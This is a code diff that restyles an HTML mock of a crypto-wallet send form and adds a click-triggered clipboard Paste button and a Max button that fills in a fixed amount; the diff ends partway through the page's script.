@@ -9,11 +9,14 @@
       font-family: sans-serif;
       padding: 20px;
       background: white;
+      margin: 0;
     }
 
     label {
       font-size: 16px;
       font-weight: 600;
+      margin-top: 20px;
+      display: block;
     }
 
     input[type="text"], input[type="number"] {
@@ -22,27 +25,39 @@
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 8px;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
     }
 
-    .usdt-row {
+    .input-group {
       display: flex;
-      justify-content: space-between;
       align-items: center;
+      position: relative;
     }
 
-    .usdt-row span {
+    .input-group input {
+      width: 100%;
+      padding-right: 70px;
+    }
+
+    .input-group button, .input-group .max-btn {
+      position: absolute;
+      right: 10px;
+      background: none;
+      border: none;
       font-weight: bold;
+      color: #007bff;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .amount-usd {
+      margin-top: -10px;
+      font-size: 15px;
       color: #555;
-    }
-
-    .max-btn {
-      color: blue;
-      font-weight: bold;
+      margin-bottom: 50px;
     }
 
     .button-container {
-      margin-top: 100px;
       text-align: center;
     }
 
@@ -56,6 +71,7 @@
       border-radius: 12px;
       cursor: pointer;
       transition: background 0.3s;
+      font-weight: bold;
     }
 
     .next-btn:disabled {
@@ -63,7 +79,7 @@
     }
 
     .fade-in {
-      animation: fadeIn 0.6s ease-in-out;
+      animation: fadeIn 0.4s ease-in-out;
     }
 
     @keyframes fadeIn {
@@ -73,21 +89,36 @@
   </style>
 </head>
 <body>
+
   <label>Address or Domain Name</label>
-  <input type="text" value="0x79069192614f7ceE4F..." readonly />
+  <div class="input-group">
+    <input type="text" value="0x79069192614f7ceE4F..." readonly />
+    <button onclick="pasteAddress()">Paste</button>
+  </div>
 
   <label>Amount</label>
-  <div class="usdt-row">
+  <div class="input-group">
     <input type="number" placeholder="0.00" step="any" inputmode="decimal" />
-    <span class="max-btn">Max</span>
+    <div class="max-btn" onclick="maxAmount()">Max</div>
   </div>
-  <p>= $0.00</p>
+
+  <div class="amount-usd">= $0.00</div>
 
   <div class="button-container">
     <button class="next-btn" id="nextBtn">Next</button>
   </div>
 
   <script>
+    function pasteAddress() {
+      navigator.clipboard.readText().then(text => {
+        document.querySelector('input[type="text"]').value = text;
+      });
+    }
+
+    function maxAmount() {
+      document.querySelector('input[type="number"]').value = "100";
+    }
+
     const btn = document.getElementById("nextBtn");
     btn.addEventListener("click", () => {
       btn.disabled = true;
